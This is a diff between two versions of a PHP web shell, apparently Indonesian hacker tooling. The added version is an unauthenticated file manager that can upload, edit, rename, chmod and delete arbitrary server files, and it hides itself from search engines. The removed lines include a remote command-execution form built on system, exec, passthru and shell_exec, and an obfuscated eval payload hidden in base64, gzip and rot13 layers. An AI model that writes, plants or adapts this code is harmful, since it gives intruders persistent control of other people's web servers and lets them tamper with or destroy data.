@@ -1,26 +1,36 @@
 <?php
+if(isset($_GET['t'])){
+} else{
+error_reporting(0);
+set_time_limit(0);
+
+if(get_magic_quotes_gpc()){
+foreach($_POST as $key=>$value){
+$_POST[$key] = stripslashes($value);
+}
+}
+$web = $_SERVER['HTTP_HOST'];
 echo '<!DOCTYPE HTML>
 <html>
 <head>
 <link href="" rel="stylesheet" type="text/css">
-<title>Xnero13-Id</title>
-<style>
+<meta name="robots" content="NOINDEX, NOFOLLOW">
+<!-- s4dness -->
+<title>{ '.$web.' }</title>
+<style type="text/css">
+
 body{
-	font-family: "Racing Sans One", cursive;
-	background-image: url("https://i.ibb.co/1QZSdGQ/photo-2022-05-18-07-18-37.jpg");
-	color:White;
-	background-attachment:fixed;
-	background-repeat:no-repeat;
-	background-position:center;
-	background-color:transparan;
-	-webkit-background-size: 90% 100%;
+font-family: "Tahoma";
+background-color: black;
+color:red;
 }
 #content tr:hover{
-background-color: Purple;
+background-color: #191919;
 text-shadow:0px 0px 10px #fff;
 }
+
 #content .first{
-background-color: Purple;
+background-color: #191919;
 }
 table{
 border: 1px #000000 dotted;
@@ -30,8 +40,8 @@ color:white;
 text-decoration: none;
 }
 a:hover{
-color:Purple;
-text-shadow:0px 0px 10px #ffffff;
+color:red;
+;
 }
 input,select,textarea{
 border: 1px #000000 solid;
@@ -42,11 +52,12 @@ border-radius:5px;
 </style>
 </head>
 <body>
-<h1><center><font color="Purple">Xnero13-Id</font></center></h1>
+	<br><br><h1><center>
+		<a href=? ><font color="red">[HOME]</font><a>
+	</center></h1>
+<div id="content">
 <table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
-<tr><td>';
-echo "Disable Functions: $liatds";
-echo '<br><font color="purple">Path :</font> ';
+<tr><td><font size="2px" color="white">Path : </font> ';
 if(isset($_GET['path'])){
 $path = $_GET['path'];
 }else{
@@ -62,34 +73,26 @@ echo '<a href="?path=/">/</a>';
 continue;
 }
 if($pat == '') continue;
-echo '<a href="?path=';
+echo '<font size="2px"><a href="?path=';
 for($i=0;$i<=$id;$i++){
 echo "$paths[$i]";
 if($i != $id) echo "/";
 }
-echo '">'.$pat.'</a>/';
+echo '">'.$pat.'</a></font>/';
 }
 echo '</td></tr><tr><td>';
 if(isset($_FILES['file'])){
 if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
-echo '<font color="white">Upload Berhasil</font><br />';
+echo '<font color="lime">Upload Berhasil</font><br />';
 }else{
-echo '<font color="purple">Upload Gagal</font><br/>';
+echo '<font color="red">Upload Gagal</font><br/>';
 }
 }
 echo '<form enctype="multipart/form-data" method="POST">
-<font color="purple">File Upload :</font> <input type="file" name="file" />
-<input type="submit" value="upload" />
-</form>';
-echo "<form method='post'>
-<font color='purple'>Command :</font>
-<input type='text' size='30' height='10' name='cmd'><input type='submit' name='execmd' value=' Execute '>
+<font color="white">Upload : </font> <input type="file" name="file" />
+<input type="submit" value=">>" />
 </form>
-</td></tr>";
-if($_POST['execmd']) {
-echo "<center><textarea cols='60' rows='10' readonly='readonly' style='color:purple; background-color:pink;'>".exe($_POST['cmd'])."</textarea></center>";
-}
-echo "<br></td></tr>";
+</td></tr>';
 if(isset($_GET['filesrc'])){
 echo "<tr><td>Current File : ";
 echo $_GET['filesrc'];
@@ -100,9 +103,9 @@ echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
 if($_POST['opt'] == 'chmod'){
 if(isset($_POST['perm'])){
 if(chmod($_POST['path'],$_POST['perm'])){
-echo '<font color="white">Change Permission Berhasil</font><br/>';
+echo '<font color="lime">Change Permission Berhasil</font><br/>';
 }else{
-echo '<font color="purple">Change Permission Gagal</font><br />';
+echo '<font color="red">Change Permission Gagal</font><br />';
 }
 }
 echo '<form method="POST">
@@ -114,9 +117,9 @@ Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o
 }elseif($_POST['opt'] == 'rename'){
 if(isset($_POST['newname'])){
 if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
-echo '<font color="white">Ganti Nama Berhasil</font><br/>';
+echo '<font color="lime">Ganti Nama Berhasil</font><br/>';
 }else{
-echo '<font color="purple">Ganti Nama Gagal</font><br />';
+echo '<font color="red">Ganti Nama Gagal</font><br />';
 }
 $_POST['name'] = $_POST['newname'];
 }
@@ -130,9 +133,9 @@ New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'
 if(isset($_POST['src'])){
 $fp = fopen($_POST['path'],'w');
 if(fwrite($fp,$_POST['src'])){
-echo '<font color="white">Berhasil Edit File</font><br/>';
+echo '<font color="lime">Berhasil Edit File</font><br/>';
 }else{
-echo '<font color="purple">Gagal Edit File</font><br/>';
+echo '<font color="red">Gagal Edit File</font><br/>';
 }
 fclose($fp);
 }
@@ -149,15 +152,15 @@ echo '</table><br/><center>';
 if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
 if($_POST['type'] == 'dir'){
 if(rmdir($_POST['path'])){
-echo '<font color="white">Directory Terhapus</font><br/>';
+echo '<font color="lime">Directory Terhapus</font><br/>';
 }else{
-echo '<font color="purple">Directory Gagal Terhapus                                                                                                                                                                                                                                                                                             </font><br/>';
+echo '<font color="red">Directory Gagal Terhapus                                                                                                                                                                                                                                                                                             </font><br/>';
 }
 }elseif($_POST['type'] == 'file'){
 if(unlink($_POST['path'])){
-echo '<font color="white">File Terhapus</font><br/>';
+echo '<font color="lime">File Terhapus</font><br/>';
 }else{
-echo '<font color="purple">File Gagal Dihapus</font><br/>';
+echo '<font color="red">File Gagal Dihapus</font><br/>';
 }
 }
 }
@@ -165,24 +168,25 @@ echo '</center>';
 $scandir = scandir($path);
 echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
 <tr class="first">
-<td><center>Name</peller></center></td>
-<td><center>Size</peller></center></td>
-<td><center>Permission</peller></center></td>
-<td><center>Modify</peller></center></td>
-</tr>';
+<td><center><font size="2px">Name</font></peller></center></td>
+<td><center><font size="2px">Size</font></peller></center></td>
+<td><center><font size="2px">Permission</font></peller></center></td>
+<td><center><font size="2px">Modify</peller></font></center></td>
+</tr>
+<tr class="first"><td></td><td></td><td></td><td></td></tr>';
 
 foreach($scandir as $dir){
 if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
 echo '<tr>
-<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
-<td><center>--</center></td>
-<td><center>';
-if(is_writable($path.'/'.$dir)) echo '<font color="Purple">';
-elseif(!is_readable($path.'/'.$dir)) echo '<font color="purple">';
+<td><font size="2px"><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></font></td>
+<td><font size="2px"><center>--</center></font></td>
+<td><font size="2px"><center>';
+if(is_writable($path.'/'.$dir)) echo '<font color="lime">';
+elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
 echo perms($path.'/'.$dir);
 if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';
 
-echo '</center></td>
+echo '</font></center></td>
 <td><center><form method="POST" action="?option&path='.$path.'">
 <select name="opt">
 <option value="">Select</option>
@@ -209,14 +213,14 @@ $size = $size.' KB';
 }
 
 echo '<tr>
-<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
-<td><center>'.$size.'</center></td>
-<td><center>';
-if(is_writable($path.'/'.$file)) echo '<font color="Green">';
-elseif(!is_readable($path.'/'.$file)) echo '<font color="Green">';
+<td><font size="2px"><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></font></td>
+<td><font size="2px"><center>'.$size.'</center></font></td>
+<td><font size="2px"><center>';
+if(is_writable($path.'/'.$file)) echo '<font color="lime">';
+elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
 echo perms($path.'/'.$file);
 if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
-echo '</center></td>
+echo '</font></center></td>
 <td><center><form method="POST" action="?option&path='.$path.'">
 <select name="opt">
 <option value="">Select</option>
@@ -235,22 +239,10 @@ echo '</center></td>
 echo '</table>
 </div>';
 }
-echo '<center><br/><font color="Purple">Xnero13-Id</font><br>';
-echo "[ <a href='?path=$path&go=cabs'>LogOut</a> ]
-</center>
+echo '
 </body>
-</html>";
-
-$command = "JcxOCoAgEADAe9AfFgm85T3Tv+iybQmxLRf09VI9YHPp8b4TONC7XEcGUMpUdKdBVtjLsYUY2CpVR513OeNzDDHGIIPXbZmXr9hD+d383ng7QlUSMizfeh8=";
-eval(str_rot13(gzinflate(str_rot13(base64_decode(($command))))));
-if($_GET['go'] == 'cabs') {
-	
-
-echo '<form action="" method="post">';
-    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]); 
-    echo '<meta http-equiv="refresh" content="3" />';
+</html>';
 }
-
 function perms($file){
 $perms = fileperms($file);
 
@@ -302,30 +294,5 @@ $info .= (($perms & 0x0001) ?
 (($perms & 0x0200) ? 'T' : '-'));
 
 return $info;
-}
-//////all functions disini tempatnya/////
-function exe($cmd) { 	
-if(function_exists('system')) { 		
-		@ob_start(); 		
-		@system($cmd); 		
-		$buff = @ob_get_contents(); 		
-		@ob_end_clean(); 		
-		return $buff; 	
-	} elseif(function_exists('exec')) { 		
-		@exec($cmd,$results); 		
-		$buff = ""; 		
-		foreach($results as $result) { 			
-			$buff .= $result; 		
-		} return $buff; 	
-	} elseif(function_exists('passthru')) { 		
-		@ob_start(); 		
-		@passthru($cmd); 		
-		$buff = @ob_get_contents(); 		
-		@ob_end_clean(); 		
-		return $buff; 	
-	} elseif(function_exists('shell_exec')) { 		
-		$buff = @shell_exec($cmd); 		
-		return $buff; 	
-	} 
 }
 ?>
